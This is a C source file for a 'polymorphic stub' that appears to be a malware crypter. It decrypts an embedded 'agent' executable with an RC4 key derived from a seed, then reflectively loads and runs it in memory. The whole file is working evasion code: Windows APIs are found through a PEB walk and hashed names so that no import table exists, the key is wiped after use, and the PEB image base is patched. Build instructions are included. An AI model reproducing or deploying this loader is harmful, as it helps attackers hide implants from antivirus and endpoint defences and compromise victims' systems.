/*
 * stub_loader.c — Polymorphic stub: decrypts and reflectively loads the agent PE.
 *
 * This file is compiled as a standalone .exe with -nostdlib and a custom
 * entry point (_stub_entry). There is NO CRT startup, NO standard library.
 * The IAT is completely empty — all APIs are resolved at runtime via
 * PEB walk + export table parsing.
 *
 * Encryption: RC4 with key derived from a seed stored in stub_payload.h.
 * The actual RC4 key is never stored on disk.
 *
 * Build (handled by pe_crypt.py):
 *   x86_64-w64-mingw32-gcc -Os -s -nostdlib -Wl,-e,_stub_entry \
 *       -Wl,--subsystem,windows stub_loader.c -o agent.exe
 */

#include <windows.h>
#include <winnt.h>

/* ─── Generated per-build: encrypted payload + seed ─── */
#include "stub_payload.h"


/* ═══════════════════════════════════════════════════════════════════
 * PEB structures (mirrors the agent's api_resolve.c)
 * ═══════════════════════════════════════════════════════════════════ */

typedef struct _STUB_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} STUB_UNICODE_STRING;

typedef struct _STUB_PEB_LDR_DATA {
    ULONG      Length;
    BOOLEAN    Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} STUB_PEB_LDR_DATA;

typedef struct _STUB_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY              InLoadOrderLinks;
    LIST_ENTRY              InMemoryOrderLinks;
    LIST_ENTRY              InInitializationOrderLinks;
    PVOID                   DllBase;
    PVOID                   EntryPoint;
    ULONG                   SizeOfImage;
    STUB_UNICODE_STRING     FullDllName;
    STUB_UNICODE_STRING     BaseDllName;
} STUB_LDR_DATA_TABLE_ENTRY;


/* ═══════════════════════════════════════════════════════════════════
 * Hash functions
 * ═══════════════════════════════════════════════════════════════════ */

/* DJB2 hash — case-insensitive for module names (wide char, length-limited) */
static DWORD _hash_mod(const wchar_t *s, USHORT lenBytes) {
    DWORD h = 5381;
    USHORT lenChars = lenBytes / sizeof(wchar_t);
    for (USHORT i = 0; i < lenChars; i++) {
        wchar_t c = s[i];
        if (c >= L'A' && c <= L'Z') c += 32;
        h = ((h << 5) + h) + (DWORD)c;
    }
    return h;
}

/* DJB2 hash — case-sensitive for function names (narrow char) */
static DWORD _hash_func(const char *s) {
    DWORD h = 5381;
    while (*s)
        h = ((h << 5) + h) + (unsigned char)*s++;
    return h;
}


/* ═══════════════════════════════════════════════════════════════════
 * PEB walk API resolver
 * ═══════════════════════════════════════════════════════════════════ */

/* Resolve a function from a module's export table by hash */
static void *_resolve_export(BYTE *modBase, DWORD funcHash) {
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)modBase;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(modBase + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    IMAGE_DATA_DIRECTORY *expDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!expDir->VirtualAddress || !expDir->Size) return NULL;

    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(modBase + expDir->VirtualAddress);
    DWORD *names    = (DWORD *)(modBase + exp->AddressOfNames);
    WORD  *ordinals = (WORD  *)(modBase + exp->AddressOfNameOrdinals);
    DWORD *funcs    = (DWORD *)(modBase + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *fname = (const char *)(modBase + names[i]);
        if (_hash_func(fname) == funcHash)
            return (void *)(modBase + funcs[ordinals[i]]);
    }
    return NULL;
}

/* Walk PEB -> Ldr -> InMemoryOrderModuleList to find a module by hash */
static BYTE *_find_module(DWORD modHash) {
    void *peb;
#if defined(_M_X64) || defined(__x86_64__)
    __asm__ volatile("mov %%gs:0x60, %0" : "=r"(peb));
#else
    __asm__ volatile("mov %%fs:0x30, %0" : "=r"(peb));
#endif

    if (!peb) return NULL;

#if defined(_M_X64) || defined(__x86_64__)
    STUB_PEB_LDR_DATA *ldr = *(STUB_PEB_LDR_DATA **)((BYTE *)peb + 0x18);
#else
    STUB_PEB_LDR_DATA *ldr = *(STUB_PEB_LDR_DATA **)((BYTE *)peb + 0x0C);
#endif

    if (!ldr) return NULL;

    LIST_ENTRY *head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY *entry = head->Flink;

    while (entry != head) {
        STUB_LDR_DATA_TABLE_ENTRY *tableEntry =
            (STUB_LDR_DATA_TABLE_ENTRY *)((BYTE *)entry - sizeof(LIST_ENTRY));

        if (tableEntry->DllBase &&
            tableEntry->BaseDllName.Buffer &&
            tableEntry->BaseDllName.Length > 0)
        {
            DWORD hash = _hash_mod(
                tableEntry->BaseDllName.Buffer,
                tableEntry->BaseDllName.Length
            );

            if (hash == modHash)
                return (BYTE *)tableEntry->DllBase;
        }

        entry = entry->Flink;
    }
    return NULL;
}


/* ═══════════════════════════════════════════════════════════════════
 * RC4 stream cipher
 * ═══════════════════════════════════════════════════════════════════ */

static void _rc4_init(unsigned char *S, const unsigned char *key, unsigned int keylen) {
    for (int i = 0; i < 256; i++)
        S[i] = (unsigned char)i;
    unsigned char j = 0;
    for (int i = 0; i < 256; i++) {
        j = (unsigned char)(j + S[i] + key[i % keylen]);
        unsigned char tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
    }
}

static void _rc4_crypt(unsigned char *S, unsigned char *data, unsigned int datalen) {
    unsigned char i = 0, j = 0;
    for (unsigned int k = 0; k < datalen; k++) {
        i = (unsigned char)(i + 1);
        j = (unsigned char)(j + S[i]);
        unsigned char tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
        data[k] ^= S[(unsigned char)(S[i] + S[j])];
    }
}


/* ═══════════════════════════════════════════════════════════════════
 * Key derivation from seed (DJB2-based expansion)
 * Must match _derive_key() in pe_crypt.py EXACTLY.
 * ═══════════════════════════════════════════════════════════════════ */

#define DERIVED_KEY_LEN 256

static void _derive_key(const unsigned char *seed, unsigned int seedlen,
                        unsigned char *key, unsigned int keylen) {
    for (unsigned int i = 0; i < keylen; i += 4) {
        unsigned int h = 5381;
        unsigned int block = i >> 2;
        for (unsigned int j = 0; j < seedlen; j++)
            h = ((h << 5) + h) ^ (seed[j] + block);
        key[i] = (unsigned char)(h & 0xFF);
        if (i + 1 < keylen) key[i + 1] = (unsigned char)((h >> 8) & 0xFF);
        if (i + 2 < keylen) key[i + 2] = (unsigned char)((h >> 16) & 0xFF);
        if (i + 3 < keylen) key[i + 3] = (unsigned char)((h >> 24) & 0xFF);
    }
}


/* ═══════════════════════════════════════════════════════════════════
 * API hash constants
 * ═══════════════════════════════════════════════════════════════════ */

/* Module hashes */
#define H_KERNEL32                  0x7040EE75
#define H_NTDLL                     0x22D3B5ED

/* Core API hashes (kernel32) */
#define H_LoadLibraryA              0x5FBFF0FB
#define H_GetProcAddress            0xCF31BB1F
#define H_VirtualAlloc              0x382C0F97
#define H_VirtualProtect            0x844FF18D
#define H_VirtualFree               0x668FCF2E
#define H_FlushInstructionCache     0xB7DCEDDD
#define H_GetCurrentProcess         0xCA8D7527
#define H_RtlAddFunctionTable       0xBDB9F1AE
#define H_SetUnhandledExceptionFilter 0x252C3659
#define H_TlsAlloc                  0x8BF55163
#define H_TlsSetValue               0xC324EBA1
#define H_ExitProcess               0xB769339E

/* Debug API hashes (kernel32) — only used with STUB_DEBUG */
#define H_CreateFileA               0xEB96C5FA
#define H_WriteFile                 0x663CECB0
#define H_CloseHandle               0x3870CA07


/* ═══════════════════════════════════════════════════════════════════
 * Debug logging via PEB-resolved APIs (NO CRT, NO stdio)
 *
 * All logging uses CreateFileA/WriteFile resolved from kernel32
 * at runtime via PEB walk. Zero IAT footprint.
 * ═══════════════════════════════════════════════════════════════════ */

#ifdef STUB_DEBUG

typedef HANDLE (WINAPI *fnCreateFileA_t)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL   (WINAPI *fnWriteFile_t)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *fnCloseHandle_t)(HANDLE);

static fnCreateFileA_t  _dbg_CreateFileA  = NULL;
static fnWriteFile_t    _dbg_WriteFile    = NULL;
static fnCloseHandle_t  _dbg_CloseHandle  = NULL;
static HANDLE           _dbg_hLog         = (HANDLE)-1;  /* INVALID_HANDLE_VALUE */

static void _dbg_init(BYTE *k32) {
    _dbg_CreateFileA = (fnCreateFileA_t)_resolve_export(k32, H_CreateFileA);
    _dbg_WriteFile   = (fnWriteFile_t)  _resolve_export(k32, H_WriteFile);
    _dbg_CloseHandle = (fnCloseHandle_t)_resolve_export(k32, H_CloseHandle);

    if (!_dbg_CreateFileA || !_dbg_WriteFile) return;

    /* Open log in a known location — no getenv() without CRT */
    _dbg_hLog = _dbg_CreateFileA(
        "C:\\Windows\\Temp\\stub_debug.log",
        FILE_APPEND_DATA,          /* Always append */
        FILE_SHARE_READ,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (_dbg_hLog != (HANDLE)-1) {
        DWORD w;
        _dbg_WriteFile(_dbg_hLog, "=== stub start ===\r\n", 20, &w, NULL);
    }
}

static void _dbg_close(void) {
    if (_dbg_hLog != (HANDLE)-1 && _dbg_CloseHandle) {
        DWORD w;
        if (_dbg_WriteFile)
            _dbg_WriteFile(_dbg_hLog, "=== stub end ===\r\n", 18, &w, NULL);
        _dbg_CloseHandle(_dbg_hLog);
        _dbg_hLog = (HANDLE)-1;
    }
}

/* String length without CRT */
static DWORD _slen(const char *s) {
    DWORD n = 0;
    while (s[n]) n++;
    return n;
}

static void _dbg_log(const char *msg) {
    if (_dbg_hLog == (HANDLE)-1 || !_dbg_WriteFile) return;
    DWORD w;
    _dbg_WriteFile(_dbg_hLog, msg, _slen(msg), &w, NULL);
    _dbg_WriteFile(_dbg_hLog, "\r\n", 2, &w, NULL);
}

static void _dbg_hex(const char *label, unsigned long long val) {
    if (_dbg_hLog == (HANDLE)-1 || !_dbg_WriteFile) return;
    /* Manual hex formatting — no sprintf without CRT */
    static const char hx[] = "0123456789ABCDEF";
    char buf[64];
    DWORD pos = 0;

    /* Copy label */
    while (*label && pos < 40) buf[pos++] = *label++;
    buf[pos++] = ':'; buf[pos++] = ' ';
    buf[pos++] = '0'; buf[pos++] = 'x';

    /* Convert value to hex (skip leading zeros) */
    int started = 0;
    for (int i = 60; i >= 0; i -= 4) {
        int nibble = (int)((val >> i) & 0xF);
        if (nibble || started || i == 0) {
            buf[pos++] = hx[nibble];
            started = 1;
        }
    }

    DWORD w;
    _dbg_WriteFile(_dbg_hLog, buf, pos, &w, NULL);
    _dbg_WriteFile(_dbg_hLog, "\r\n", 2, &w, NULL);
}

#define SLOG(msg)       _dbg_log(msg)
#define SHEX(label, v)  _dbg_hex(label, (unsigned long long)(v))
#else
#define SLOG(msg)       ((void)0)
#define SHEX(label, v)  ((void)0)
#endif


/* ═══════════════════════════════════════════════════════════════════
 * Resolved API function pointer table
 * ═══════════════════════════════════════════════════════════════════ */

typedef HMODULE (WINAPI *fnLoadLibraryA_t)(LPCSTR);
typedef FARPROC (WINAPI *fnGetProcAddress_t)(HMODULE, LPCSTR);
typedef LPVOID  (WINAPI *fnVirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *fnVirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL    (WINAPI *fnVirtualFree_t)(LPVOID, SIZE_T, DWORD);
typedef BOOL    (WINAPI *fnFlushInstructionCache_t)(HANDLE, LPCVOID, SIZE_T);
typedef HANDLE  (WINAPI *fnGetCurrentProcess_t)(void);
typedef LPTOP_LEVEL_EXCEPTION_FILTER (WINAPI *fnSetUnhandledExceptionFilter_t)(LPTOP_LEVEL_EXCEPTION_FILTER);
typedef DWORD   (WINAPI *fnTlsAlloc_t)(void);
typedef BOOL    (WINAPI *fnTlsSetValue_t)(DWORD, LPVOID);
typedef void    (WINAPI *fnExitProcess_t)(UINT);

#if defined(_M_X64) || defined(__x86_64__)
typedef BOOLEAN (WINAPI *fnRtlAddFunctionTable_t)(PRUNTIME_FUNCTION, DWORD, DWORD64);
#endif

typedef struct {
    fnLoadLibraryA_t         pLoadLibraryA;
    fnGetProcAddress_t       pGetProcAddress;
    fnVirtualAlloc_t         pVirtualAlloc;
    fnVirtualProtect_t       pVirtualProtect;
    fnVirtualFree_t          pVirtualFree;
    fnFlushInstructionCache_t pFlushInstructionCache;
    fnGetCurrentProcess_t    pGetCurrentProcess;
    fnSetUnhandledExceptionFilter_t pSetUnhandledExceptionFilter;
    fnTlsAlloc_t             pTlsAlloc;
    fnTlsSetValue_t          pTlsSetValue;
    fnExitProcess_t          pExitProcess;
#if defined(_M_X64) || defined(__x86_64__)
    fnRtlAddFunctionTable_t  pRtlAddFunctionTable;
#endif
} RESOLVED_APIS;


static BOOL _resolve_apis(RESOLVED_APIS *api) {
    SLOG("[stub] finding kernel32...");

    BYTE *k32 = _find_module(H_KERNEL32);
    if (!k32) {
        SLOG("[stub] FATAL: kernel32 not found via PEB walk");
        return FALSE;
    }

    SHEX("[stub] kernel32 base", (ULONG_PTR)k32);

    /* Initialize debug logging FIRST so we can log subsequent steps */
#ifdef STUB_DEBUG
    _dbg_init(k32);
    SLOG("[stub] debug logging initialized");
#endif

    api->pLoadLibraryA       = (fnLoadLibraryA_t)      _resolve_export(k32, H_LoadLibraryA);
    api->pGetProcAddress     = (fnGetProcAddress_t)     _resolve_export(k32, H_GetProcAddress);
    api->pVirtualAlloc       = (fnVirtualAlloc_t)       _resolve_export(k32, H_VirtualAlloc);
    api->pVirtualProtect     = (fnVirtualProtect_t)     _resolve_export(k32, H_VirtualProtect);
    api->pVirtualFree        = (fnVirtualFree_t)        _resolve_export(k32, H_VirtualFree);
    api->pFlushInstructionCache = (fnFlushInstructionCache_t)_resolve_export(k32, H_FlushInstructionCache);
    api->pGetCurrentProcess  = (fnGetCurrentProcess_t)  _resolve_export(k32, H_GetCurrentProcess);
    api->pExitProcess        = (fnExitProcess_t)        _resolve_export(k32, H_ExitProcess);

    api->pSetUnhandledExceptionFilter = (fnSetUnhandledExceptionFilter_t)_resolve_export(k32, H_SetUnhandledExceptionFilter);
    api->pTlsAlloc    = (fnTlsAlloc_t)   _resolve_export(k32, H_TlsAlloc);
    api->pTlsSetValue = (fnTlsSetValue_t)_resolve_export(k32, H_TlsSetValue);

    SLOG("[stub] core APIs resolved");

#if defined(_M_X64) || defined(__x86_64__)
    api->pRtlAddFunctionTable = (fnRtlAddFunctionTable_t)_resolve_export(k32, H_RtlAddFunctionTable);
    if (!api->pRtlAddFunctionTable) {
        BYTE *ntdll = _find_module(H_NTDLL);
        if (ntdll)
            api->pRtlAddFunctionTable = (fnRtlAddFunctionTable_t)_resolve_export(ntdll, H_RtlAddFunctionTable);
    }
    SLOG(api->pRtlAddFunctionTable ? "[stub] RtlAddFunctionTable OK" : "[stub] RtlAddFunctionTable MISSING");
#endif

    BOOL ok = (api->pLoadLibraryA && api->pGetProcAddress &&
               api->pVirtualAlloc && api->pVirtualProtect &&
               api->pExitProcess);
    SLOG(ok ? "[stub] all APIs OK" : "[stub] FAIL: missing critical API");
    return ok;
}


/* ═══════════════════════════════════════════════════════════════════
 * Crash handler (debug builds)
 * ═══════════════════════════════════════════════════════════════════ */

#ifdef STUB_DEBUG
static LONG WINAPI _stub_exception_handler(EXCEPTION_POINTERS *ep) {
    SLOG("[stub] !!! UNHANDLED EXCEPTION !!!");
    if (ep && ep->ExceptionRecord) {
        SHEX("[stub] exception code", ep->ExceptionRecord->ExceptionCode);
        SHEX("[stub] exception addr", (ULONG_PTR)ep->ExceptionRecord->ExceptionAddress);
    }
    if (ep && ep->ContextRecord) {
#if defined(_M_X64) || defined(__x86_64__)
        SHEX("[stub] RIP", ep->ContextRecord->Rip);
        SHEX("[stub] RSP", ep->ContextRecord->Rsp);
        SHEX("[stub] RAX", ep->ContextRecord->Rax);
        SHEX("[stub] RCX", ep->ContextRecord->Rcx);
        SHEX("[stub] RDX", ep->ContextRecord->Rdx);
#endif
    }
    _dbg_close();
    return EXCEPTION_CONTINUE_SEARCH;
}
#endif


/* ═══════════════════════════════════════════════════════════════════
 * Reflective PE Loader
 * ═══════════════════════════════════════════════════════════════════ */

typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);

static BOOL _process_relocs(BYTE *base, IMAGE_NT_HEADERS *nt, LONGLONG delta) {
    IMAGE_DATA_DIRECTORY *relocDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (!relocDir->VirtualAddress || !relocDir->Size)
        return TRUE;

    IMAGE_BASE_RELOCATION *reloc = (IMAGE_BASE_RELOCATION *)(base + relocDir->VirtualAddress);
    IMAGE_BASE_RELOCATION *end   = (IMAGE_BASE_RELOCATION *)((BYTE *)reloc + relocDir->Size);

    while (reloc < end && reloc->SizeOfBlock > 0) {
        DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD *entries = (WORD *)((BYTE *)reloc + sizeof(IMAGE_BASE_RELOCATION));

        for (DWORD i = 0; i < count; i++) {
            WORD type   = entries[i] >> 12;
            WORD offset = entries[i] & 0x0FFF;
            BYTE *patch = base + reloc->VirtualAddress + offset;

            switch (type) {
                case IMAGE_REL_BASED_DIR64:
                    *(ULONGLONG *)patch += (ULONGLONG)delta;
                    break;
                case IMAGE_REL_BASED_HIGHLOW:
                    *(DWORD *)patch += (DWORD)delta;
                    break;
                case IMAGE_REL_BASED_HIGH:
                    *(WORD *)patch += (WORD)(delta >> 16);
                    break;
                case IMAGE_REL_BASED_LOW:
                    *(WORD *)patch += (WORD)delta;
                    break;
                case IMAGE_REL_BASED_ABSOLUTE:
                    break;
                default:
                    return FALSE;
            }
        }
        reloc = (IMAGE_BASE_RELOCATION *)((BYTE *)reloc + reloc->SizeOfBlock);
    }
    return TRUE;
}

static BOOL _process_imports(BYTE *base, IMAGE_NT_HEADERS *nt, RESOLVED_APIS *api) {
    IMAGE_DATA_DIRECTORY *impDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!impDir->VirtualAddress || !impDir->Size)
        return TRUE;

    IMAGE_IMPORT_DESCRIPTOR *imp = (IMAGE_IMPORT_DESCRIPTOR *)(base + impDir->VirtualAddress);

    while (imp->Name) {
        const char *dllName = (const char *)(base + imp->Name);
        SLOG(dllName);
        HMODULE hMod = api->pLoadLibraryA(dllName);
        if (!hMod) {
            SLOG("[stub] FAIL: LoadLibraryA returned NULL");
            return FALSE;
        }

        IMAGE_THUNK_DATA *origThunk = (IMAGE_THUNK_DATA *)(base +
            (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));
        IMAGE_THUNK_DATA *iatThunk  = (IMAGE_THUNK_DATA *)(base + imp->FirstThunk);

        while (origThunk->u1.AddressOfData) {
            FARPROC func;
            if (IMAGE_SNAP_BY_ORDINAL(origThunk->u1.Ordinal)) {
                func = api->pGetProcAddress(hMod,
                    (LPCSTR)IMAGE_ORDINAL(origThunk->u1.Ordinal));
            } else {
                IMAGE_IMPORT_BY_NAME *ibn = (IMAGE_IMPORT_BY_NAME *)(base +
                    origThunk->u1.AddressOfData);
                func = api->pGetProcAddress(hMod, ibn->Name);
            }
            if (!func) {
                SLOG("[stub] FAIL: function resolve failed");
                return FALSE;
            }

            iatThunk->u1.Function = (ULONGLONG)func;
            origThunk++;
            iatThunk++;
        }
        imp++;
    }
    return TRUE;
}

static void _protect_sections(BYTE *base, IMAGE_NT_HEADERS *nt, RESOLVED_APIS *api) {
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        DWORD protect = PAGE_NOACCESS;
        DWORD chars = sec->Characteristics;
        BOOL exec  = !!(chars & IMAGE_SCN_MEM_EXECUTE);
        BOOL read  = !!(chars & IMAGE_SCN_MEM_READ);
        BOOL write = !!(chars & IMAGE_SCN_MEM_WRITE);

        if (exec && write)       protect = PAGE_EXECUTE_READWRITE;
        else if (exec && read)   protect = PAGE_EXECUTE_READ;
        else if (exec)           protect = PAGE_EXECUTE;
        else if (read && write)  protect = PAGE_READWRITE;
        else if (read)           protect = PAGE_READONLY;
        else if (write)          protect = PAGE_READWRITE;

        DWORD old;
        SIZE_T secSize = sec->SizeOfRawData ? sec->SizeOfRawData : sec->Misc.VirtualSize;
        if (secSize > 0)
            api->pVirtualProtect(base + sec->VirtualAddress, secSize, protect, &old);
    }
}

static void _process_tls(BYTE *base, IMAGE_NT_HEADERS *nt, RESOLVED_APIS *api) {
    IMAGE_DATA_DIRECTORY *tlsDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (!tlsDir->VirtualAddress || !tlsDir->Size) {
        SLOG("[stub] TLS: no TLS directory");
        return;
    }

    IMAGE_TLS_DIRECTORY *tls = (IMAGE_TLS_DIRECTORY *)(base + tlsDir->VirtualAddress);
    SLOG("[stub] TLS: directory found");

    /* Allocate TLS slot and copy initial data */
    if (api->pTlsAlloc && api->pTlsSetValue && tls->AddressOfIndex) {
        DWORD tlsIndex = api->pTlsAlloc();
        SHEX("[stub] TLS: allocated index", tlsIndex);
        *(DWORD *)tls->AddressOfIndex = tlsIndex;

        if (tls->StartAddressOfRawData && tls->EndAddressOfRawData) {
            SIZE_T dataSize = tls->EndAddressOfRawData - tls->StartAddressOfRawData;
            if (dataSize > 0) {
                LPVOID tlsData = api->pVirtualAlloc(NULL, dataSize,
                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (tlsData) {
                    BYTE *src = (BYTE *)tls->StartAddressOfRawData;
                    BYTE *dst = (BYTE *)tlsData;
                    for (SIZE_T i = 0; i < dataSize; i++) dst[i] = src[i];
                    api->pTlsSetValue(tlsIndex, tlsData);
                    SHEX("[stub] TLS: data copied, size", dataSize);
                }
            }
        }
    }

    /* Call TLS callbacks */
    if (tls->AddressOfCallBacks) {
        PIMAGE_TLS_CALLBACK *callbacks = (PIMAGE_TLS_CALLBACK *)tls->AddressOfCallBacks;
        int cbCount = 0;
        while (*callbacks) {
            (*callbacks)((PVOID)base, DLL_PROCESS_ATTACH, NULL);
            callbacks++;
            cbCount++;
        }
        SHEX("[stub] TLS: callbacks called", cbCount);
    } else {
        SLOG("[stub] TLS: no callbacks");
    }
}

static BOOL _load_pe(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
    SLOG("[stub] _load_pe enter");

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)rawPE;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { SLOG("[stub] FAIL: bad MZ"); return FALSE; }

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(rawPE + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) { SLOG("[stub] FAIL: bad PE sig"); return FALSE; }

    SLOG("[stub] PE validated");

    DWORD imageSize = nt->OptionalHeader.SizeOfImage;
    BYTE *base = (BYTE *)api->pVirtualAlloc(
        (LPVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase,
        imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );

    LONGLONG delta = 0;
    if (!base) {
        base = (BYTE *)api->pVirtualAlloc(
            NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
        );
        if (!base) { SLOG("[stub] FAIL: VirtualAlloc"); return FALSE; }
        SLOG("[stub] fallback alloc");
    } else {
        SLOG("[stub] preferred base alloc");
    }
    delta = (LONGLONG)((ULONGLONG)base - nt->OptionalHeader.ImageBase);
    SHEX("[stub] base", (ULONG_PTR)base);
    SHEX("[stub] delta", delta);

    /* Copy headers */
    for (DWORD i = 0; i < nt->OptionalHeader.SizeOfHeaders; i++)
        base[i] = rawPE[i];

    /* Map sections */
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (sec->SizeOfRawData == 0) continue;
        BYTE *dst = base + sec->VirtualAddress;
        BYTE *src = rawPE + sec->PointerToRawData;
        for (DWORD j = 0; j < sec->SizeOfRawData; j++)
            dst[j] = src[j];
    }
    SLOG("[stub] sections mapped");

    IMAGE_NT_HEADERS *mappedNt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);

    /* Relocations */
    if (delta != 0) {
        if (!_process_relocs(base, mappedNt, delta)) { SLOG("[stub] FAIL: relocs"); return FALSE; }
        SLOG("[stub] relocs done");
    }

    /* Imports */
    SLOG("[stub] resolving imports...");
    if (!_process_imports(base, mappedNt, api)) { SLOG("[stub] FAIL: imports"); return FALSE; }
    SLOG("[stub] imports done");

    /* Flush icache */
    if (api->pFlushInstructionCache && api->pGetCurrentProcess)
        api->pFlushInstructionCache(api->pGetCurrentProcess(), NULL, 0);

    /* Exception handlers (x64) */
#if defined(_M_X64) || defined(__x86_64__)
    {
        IMAGE_DATA_DIRECTORY *excDir = &mappedNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
        if (excDir->VirtualAddress && excDir->Size && api->pRtlAddFunctionTable) {
            PRUNTIME_FUNCTION pFunc = (PRUNTIME_FUNCTION)(base + excDir->VirtualAddress);
            DWORD numEntries = excDir->Size / sizeof(RUNTIME_FUNCTION);
            api->pRtlAddFunctionTable(pFunc, numEntries, (DWORD64)base);
            SLOG("[stub] .pdata registered");
        }
    }
#endif

    /* Section protections */
    _protect_sections(base, mappedNt, api);
    SLOG("[stub] protections set");

    /* TLS */
    _process_tls(base, mappedNt, api);

    /* Patch PEB.ImageBaseAddress */
    {
        void *peb;
#if defined(_M_X64) || defined(__x86_64__)
        __asm__ volatile("mov %%gs:0x60, %0" : "=r"(peb));
        *(void **)((BYTE *)peb + 0x10) = base;
#else
        __asm__ volatile("mov %%fs:0x30, %0" : "=r"(peb));
        *(void **)((BYTE *)peb + 0x08) = base;
#endif
    }

    /* Install crash handler (debug builds) */
#ifdef STUB_DEBUG
    if (api->pSetUnhandledExceptionFilter) {
        api->pSetUnhandledExceptionFilter(_stub_exception_handler);
        SLOG("[stub] exception handler installed");
    }
#endif

    /* Call entry point */
    DWORD entryRVA = mappedNt->OptionalHeader.AddressOfEntryPoint;
    if (!entryRVA) { SLOG("[stub] FAIL: no entry RVA"); return FALSE; }

    void *entry = base + entryRVA;
    SHEX("[stub] entry", (ULONG_PTR)entry);
    SLOG("[stub] calling entry...");

    if (mappedNt->FileHeader.Characteristics & IMAGE_FILE_DLL) {
        DllMain_t dllMain = (DllMain_t)entry;
        dllMain((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
    } else {
        typedef int (*MainFunc_t)(void);
        MainFunc_t ep = (MainFunc_t)entry;
        int ret = ep();
        SHEX("[stub] entry returned", ret);
    }

    return TRUE;
}


/* ═══════════════════════════════════════════════════════════════════
 * Entry point — NO CRT, ZERO IAT imports
 *
 * Linked with -nostdlib -Wl,-e,_stub_entry
 * This function IS the process entry point. No WinMainCRTStartup,
 * no GetModuleHandleA, no GetProcAddress in the IAT.
 * ═══════════════════════════════════════════════════════════════════ */

void _stub_entry(void) {

    /* Phase 1: Resolve APIs via PEB walk */
    RESOLVED_APIS api;
    /* Zero-init without memset (no CRT) */
    {
        BYTE *p = (BYTE *)&api;
        for (unsigned int i = 0; i < sizeof(api); i++) p[i] = 0;
    }

    if (!_resolve_apis(&api)) {
        SLOG("[stub] FATAL: API resolution failed");
#ifdef STUB_DEBUG
        _dbg_close();
#endif
        /* Can't call ExitProcess — it wasn't resolved. Just return. */
        return;
    }

    /* Phase 2: Derive RC4 key from seed */
    SLOG("[stub] deriving key...");
    unsigned char rc4_key[DERIVED_KEY_LEN];
    _derive_key(g_res_cfg, RES_CFG_SIZE, rc4_key, DERIVED_KEY_LEN);

    /* Phase 3: RC4 decrypt payload */
    SLOG("[stub] decrypting...");
    {
        unsigned char S[256];
        _rc4_init(S, rc4_key, DERIVED_KEY_LEN);
        _rc4_crypt(S, g_res_data, RES_DATA_SIZE);
    }

    /* Wipe key from stack */
    {
        volatile unsigned char *p = rc4_key;
        for (int i = 0; i < DERIVED_KEY_LEN; i++) p[i] = 0;
    }

    /* Verify decryption (check MZ header) */
    if (g_res_data[0] != 'M' || g_res_data[1] != 'Z') {
        SLOG("[stub] FATAL: bad MZ after decrypt");
#ifdef STUB_DEBUG
        _dbg_close();
#endif
        api.pExitProcess(1);
        return;  /* unreachable, but satisfies compiler */
    }
    SLOG("[stub] decrypt OK");

    /* Phase 4: Load and execute */
    if (!_load_pe(g_res_data, RES_DATA_SIZE, &api)) {
        SLOG("[stub] FATAL: load failed");
#ifdef STUB_DEBUG
        _dbg_close();
#endif
        api.pExitProcess(1);
        return;
    }

#ifdef STUB_DEBUG
    _dbg_close();
#endif
    /* Agent's main() has returned — exit cleanly */
    api.pExitProcess(0);
}
